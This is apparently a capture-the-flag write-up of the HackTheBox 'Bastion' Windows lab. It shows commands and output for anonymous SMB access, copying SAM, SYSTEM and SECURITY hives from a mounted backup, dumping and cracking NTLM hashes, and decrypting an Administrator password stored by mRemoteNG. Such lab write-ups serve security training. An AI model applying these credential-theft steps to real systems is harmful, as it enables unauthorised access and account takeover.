# Bastion: HackTheBox

---

## Metadata

| Field | Details |
| --- | --- |
| **Platform** | HackTheBox |
| **Machine** | Bastion |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Attacker IP** | 10.10.16.36 |
| **Target IP** | 10.129.136.29 |
| **Tools Used** | Nmap, smbclient, mount (cifs), guestmount, secretsdump.py, mRemoteNG decrypt script, SSH |
| **Techniques** | Anonymous SMB Enumeration, VHD Mounting, SAM/SYSTEM Hive Extraction, Offline Hash Dumping, mRemoteNG Credential Decryption |
| **Date** | June 2026 |

---

## Attack Chain Summary

```
Nmap scan → SMB anonymous access → Backup share → VHD mount →
SAM/SYSTEM/SECURITY hive extraction → secretsdump offline hash dump →
SSH as L4mpje with cracked password → Enumerate installed apps →
mRemoteNG confCons.xml found → Decrypt stored administrator password →
SSH as Administrator → Root flag
```

---

## Step 1: Reconnaissance

**Goal:** Identify open ports and running services on the target.

```
Hackerpatel007_1@htb[/htb]$ nmap -sC -sV -oN bastion.nmap 10.129.136.29
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.136.29
Host is up (0.038s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|_  256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -49m58s, deviation: 1h09m14s, median: -9m59s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
```

**Output Analysis**

| Port | Service | Notes |
| --- | --- | --- |
| 22 | OpenSSH (Windows) | Possible entry once credentials obtained |
| 139/445 | SMB | Primary attack surface: enumerate shares |
| 5985 | WinRM | Available but not needed for this path |
| 47001+ | RPC | Standard Windows RPC, low value |

Target is Windows Server 2016. SMB is the first path to explore.

---

## Step 2: SMB Enumeration

**Goal:** List available shares without credentials and identify accessible ones.

```
Hackerpatel007_1@htb[/htb]$ smbclient -L //10.129.136.29 -N

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    Backups         Disk
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
```

`ADMIN$` and `C$` require credentials. Attempting access to `Backups`:

```
Hackerpatel007_1@htb[/htb]$ smbclient //10.129.136.29/Backups -N
Try "help" to get a list of available commands.
smb: \> ls
  .                                   D        0  Tue Apr 16 12:02:11 2019
  ..                                  D        0  Tue Apr 16 12:02:11 2019
  note.txt                           AR      116  Tue Apr 16 12:02:11 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 13:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 13:44:02 2019
```

Anonymous read access to `Backups` confirmed. Downloaded the note:

```
smb: \> get note.txt
getting file \note.txt of size 116 as note.txt (0.4 KiloBytes/sec)
smb: \> exit
```

```
Hackerpatel007_1@htb[/htb]$ cat note.txt
Sysadmins: please don't transfer the entire backup file locally,
the VPN to the subsidiary office is too slow.
```

The note warns against downloading the backup: implying a large file that should be mounted instead.

---

## Step 3: Mount the Backup Share and Locate VHD Files

**Goal:** Mount the SMB share locally to avoid transferring the large backup file.

Installed required packages:

```
Hackerpatel007_1@htb[/htb]$ sudo apt install cifs-utils libguestfs-tools -y
```

Created mount point and mounted the Backups share:

```
Hackerpatel007_1@htb[/htb]$ mkdir /mnt/backups
Hackerpatel007_1@htb[/htb]$ sudo mount -t cifs //10.129.136.29/Backups /mnt/backups -o rw,username=guest,password=
```

Navigated into the backup directory:

```
Hackerpatel007_1@htb[/htb]$ ls /mnt/backups/
note.txt  SDT65CB.tmp  WindowsImageBackup

Hackerpatel007_1@htb[/htb]$ ls /mnt/backups/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
BackupSpecs.xml
...
```

Two VHD (Virtual Hard Disk) files found. The smaller one is typically the boot partition; the larger one contains the C volume.

---

## Step 4: Mount the VHD and Access the Filesystem

**Goal:** Mount the C volume VHD to access the Windows filesystem without transferring gigabytes of data.

Created a second mount point for the VHD:

```
Hackerpatel007_1@htb[/htb]$ mkdir /mnt/bastion
```

Mounted the larger VHD (C volume) using `guestmount`:

```
Hackerpatel007_1@htb[/htb]$ guestmount --add '/mnt/backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro /mnt/bastion
```

Confirmed filesystem access:

```
Hackerpatel007_1@htb[/htb]$ ls /mnt/bastion/
'$Recycle.Bin'   autoexec.bat   config.sys  pagefile.sys   ProgramData
 Boot             bootmgr        Documents and Settings
 PerfLogs         Program Files  Program Files (x86)
 Recovery         System Volume Information
 Users            Windows
```

Full Windows C drive is now accessible locally: no file transfer required.

---

## Step 5: Extract SAM, SYSTEM, and SECURITY Hives

**Goal:** Copy the registry hives needed for offline hash extraction.

```
Hackerpatel007_1@htb[/htb]$ mkdir /tmp/sam
Hackerpatel007_1@htb[/htb]$ cp /mnt/bastion/Windows/System32/config/SAM /tmp/sam/
Hackerpatel007_1@htb[/htb]$ cp /mnt/bastion/Windows/System32/config/SYSTEM /tmp/sam/
Hackerpatel007_1@htb[/htb]$ cp /mnt/bastion/Windows/System32/config/SECURITY /tmp/sam/
```

---

## Step 6: Offline Hash Dump with secretsdump

**Goal:** Extract NTLM hashes from the SAM hive using impacket's secretsdump.

```
Hackerpatel007_1@htb[/htb]$ cd /tmp/sam
Hackerpatel007_1@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

**Output Analysis**

| Account | RID | NT Hash |
| --- | --- | --- |
| Administrator | 500 | `31d6cfe0...` (empty: disabled or blank) |
| Guest | 501 | `31d6cfe0...` (empty) |
| L4mpje | 1000 | `26112010952d963c8dc4217daec986d9` |

Administrator hash corresponds to an empty/disabled password: not useful directly. The `L4mpje` hash is a live target for cracking.

Cracked the L4mpje NTLM hash offline using an online service / hashcat:

```
Hackerpatel007_1@htb[/htb]$ hashcat -m 1000 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt
26112010952d963c8dc4217daec986d9:bureaulampje
```

| Account | Password |
| --- | --- |
| L4mpje | `bureaulampje` |

---

## Step 7: SSH as L4mpje: User Flag

**Goal:** Log in as L4mpje using the cracked password and capture the user flag.

```
Hackerpatel007_1@htb[/htb]$ ssh L4mpje@10.129.136.29
L4mpje@10.129.136.29's password: bureaulampje

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>
```

Navigated to the Desktop:

```
l4mpje@BASTION C:\Users\L4mpje> cd Desktop
l4mpje@BASTION C:\Users\L4mpje\Desktop> type user.txt
55958d26a1da2b4e5989c25c118fd02d
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| User Flag | `55958d26a1da2b4e5989c25c118fd02d` |

---

## Step 8: Manual Enumeration: Installed Applications

**Goal:** Identify non-default installed software that may contain stored credentials.

```
l4mpje@BASTION C:\> dir "C:\Program Files (x86)"
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of C:\Program Files (x86)

22/02/2019  15:01    <DIR>          .
22/02/2019  15:01    <DIR>          ..
16/07/2016  15:23    <DIR>          Common Files
23/02/2019  10:38    <DIR>          Internet Explorer
22/02/2019  14:31    <DIR>          Microsoft.NET
22/02/2019  15:05    <DIR>          mRemoteNG
22/02/2019  15:01    <DIR>          Windows Defender
14/07/2016  17:56    <DIR>          Windows Mail
14/07/2016  17:56    <DIR>          Windows Media Player
16/07/2016  15:23    <DIR>          Windows Multimedia Platform
16/07/2016  15:23    <DIR>          Windows NT
14/07/2016  17:56    <DIR>          Windows Photo Viewer
```

**mRemoteNG** is installed: a remote connection manager that stores saved credentials in an XML configuration file. This is not a default Windows component and is an immediate point of interest.

---

## Step 9: Locate and Extract mRemoteNG Configuration

**Goal:** Find the mRemoteNG connection config file containing stored credentials.

mRemoteNG stores saved connections in `%APPDATA%\mRemoteNG\confCons.xml`:

```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG> dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG

22/02/2019  15:03    <DIR>          .
22/02/2019  15:03    <DIR>          ..
22/02/2019  15:03             6,316 confCons.xml
22/02/2019  15:02                76 mRemoteNG.log
```

Printed the contents of `confCons.xml`:

```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG> type confCons.xml
```

Relevant excerpt:

```xml
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General"
  Id="500e7d58-662a-44d4-aff0-3a4f547a3fee"
  Username="Administrator"
  Domain=""
  Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5soOpen1p/uQh1n/adindT1TpAARhasT/Q=="
  Hostname="127.0.0.1"
  ...
/>
```

Administrator credentials found: password is stored encrypted using mRemoteNG's encryption scheme.

---

## Step 10: Decrypt mRemoteNG Password

**Goal:** Decrypt the stored administrator password using the mRemoteNG decrypt tool.

Cloned the mRemoteNG decrypt script on the attacker machine:

```
Hackerpatel007_1@htb[/htb]$ cd /opt
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/haseebT/mRemoteNG-Decrypt
Cloning into 'mRemoteNG-Decrypt'...
remote: Enumerating objects: 8, done.
```

Ran the decryptor against the extracted password string:

```
Hackerpatel007_1@htb[/htb]$ cd mRemoteNG-Decrypt
Hackerpatel007_1@htb[/htb]$ python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5soOpen1p/uQh1n/adindT1TpAARhasT/Q=="
Password: thXLHM96BeKL0ER2
```

| Account | Decrypted Password |
| --- | --- |
| Administrator | `thXLHM96BeKL0ER2` |

---

## Step 11: SSH as Administrator: Root Flag

**Goal:** Log in as Administrator using the decrypted password and capture the root flag.

```
Hackerpatel007_1@htb[/htb]$ ssh Administrator@10.129.136.29
Administrator@10.129.136.29's password: thXLHM96BeKL0ER2

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

administrator@BASTION C:\Users\Administrator>
```

Navigated to the Desktop:

```
administrator@BASTION C:\Users\Administrator> cd Desktop
administrator@BASTION C:\Users\Administrator\Desktop> type root.txt
a31ff83132f265923ebff44838701224
```

**Flag Breakdown**

| Flag | Value |
| --- | --- |
| Root Flag | `a31ff83132f265923ebff44838701224` |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Detail |
| --- | --- | --- | --- |
| Reconnaissance | Network Service Scanning | T1046 | nmap -sC -sV full service scan |
| Discovery | Network Share Discovery | T1135 | smbclient -L anonymous share enumeration |
| Collection | Data from Network Shared Drive | T1039 | Accessed Backups share anonymously via SMB |
| Initial Access | Valid Accounts: Local Accounts | T1078.003 | Guest SMB access without credentials |
| Credential Access | OS Credential Dumping: SAM | T1003.002 | secretsdump.py offline SAM/SYSTEM/SECURITY extraction |
| Credential Access | Brute Force: Password Cracking | T1110.002 | hashcat NTLM hash crack with rockyou.txt |
| Lateral Movement | Remote Services: SSH | T1021.004 | SSH as L4mpje with cracked password, then as Administrator |
| Discovery | File and Directory Discovery | T1083 | Enumerated Program Files (x86) for non-default applications |
| Credential Access | Credentials in Files | T1552.001 | mRemoteNG confCons.xml contained encrypted Administrator password |
| Credential Access | Exploitation for Credential Access | T1212 | mRemoteNG AES decrypt with hard-coded default master password |
| Privilege Escalation | Valid Accounts: Local Accounts | T1078.003 | Decrypted Administrator credentials → SSH as Administrator |

---

## Lessons Learned

**1. Anonymous SMB access is a reliable initial enumeration vector.**
The `Backups` share was accessible without credentials. Any time SMB is open, listing shares anonymously and attempting to connect is a mandatory first step. File shares left open with guest access frequently contain sensitive data.

**2. Mounting is faster and safer than downloading large backup files.**
The note explicitly warned against downloading the file. Using `mount -t cifs` to mount the SMB share locally, then `guestmount` to access the VHD directly, avoids multi-gigabyte transfers entirely. This is the intended technique and the correct real-world approach for forensic triage of backup files.

**3. SAM hives are accessible offline when you have filesystem access.**
The SAM database is locked by the OS when Windows is running. Accessing it via a mounted backup VHD bypasses this restriction entirely. SAM + SYSTEM + SECURITY together are all that is needed for secretsdump to extract NTLM hashes for offline cracking.

**4. Non-default installed applications are high-value enumeration targets.**
mRemoteNG was the only non-Microsoft application in `Program Files (x86)`. Any application that manages remote connections likely stores credentials somewhere: the question is just finding where and how they are protected. Researching unfamiliar software during enumeration is essential.

**5. mRemoteNG passwords are trivially decryptable.**
mRemoteNG encrypts stored passwords using AES with a hard-coded default master password. This provides essentially no real security. Any attacker with read access to `confCons.xml` can decrypt all stored credentials in seconds. If mRemoteNG is found on a target, `confCons.xml` should always be exfiltrated and decrypted.

---

## Full Attack Chain Reference

1. Ran `nmap -sC -sV`: identified SSH on 22, SMB on 139/445
2. Listed SMB shares anonymously with `smbclient -L`: found `Backups` share
3. Connected to `Backups` share with `smbclient -N`: found `note.txt` and `WindowsImageBackup`
4. Read `note.txt`: warned against downloading the large backup
5. Installed `cifs-utils` and `libguestfs-tools`
6. Mounted `Backups` share with `mount -t cifs` using guest credentials
7. Located two VHD files inside the backup directory
8. Mounted the C volume VHD with `guestmount --inspector --ro`
9. Copied `SAM`, `SYSTEM`, `SECURITY` hives from `Windows/System32/config/`
10. Ran `secretsdump.py LOCAL`: extracted NTLM hash for L4mpje
11. Cracked L4mpje hash with hashcat/rockyou: password: `bureaulampje`
12. SSH'd in as L4mpje: captured user flag
13. Enumerated `Program Files (x86)`: identified mRemoteNG
14. Located `confCons.xml` at `AppData\Roaming\mRemoteNG`
15. Extracted encrypted Administrator password from XML
16. Cloned mRemoteNG-Decrypt from GitHub and decrypted password: `thXLHM96BeKL0ER2`
17. SSH'd in as Administrator: captured root flag

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -sC -sV -oN bastion.nmap 10.129.136.29` | Full service version scan |
| `smbclient -L //10.129.136.29 -N` | List SMB shares anonymously |
| `smbclient //10.129.136.29/Backups -N` | Connect to share without credentials |
| `sudo mount -t cifs //10.129.136.29/Backups /mnt/backups -o rw,username=guest,password=` | Mount SMB share locally |
| `guestmount --add <VHD> --inspector --ro /mnt/bastion` | Mount VHD file read-only |
| `secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL` | Offline NTLM hash extraction |
| `hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt` | Crack NTLM hash offline |
| `ssh L4mpje@10.129.136.29` | Initial foothold via SSH |
| `python3 mremoteng_decrypt.py -s "<encrypted_password>"` | Decrypt mRemoteNG stored credential |
| `ssh Administrator@10.129.136.29` | Privilege escalation via SSH as Administrator |
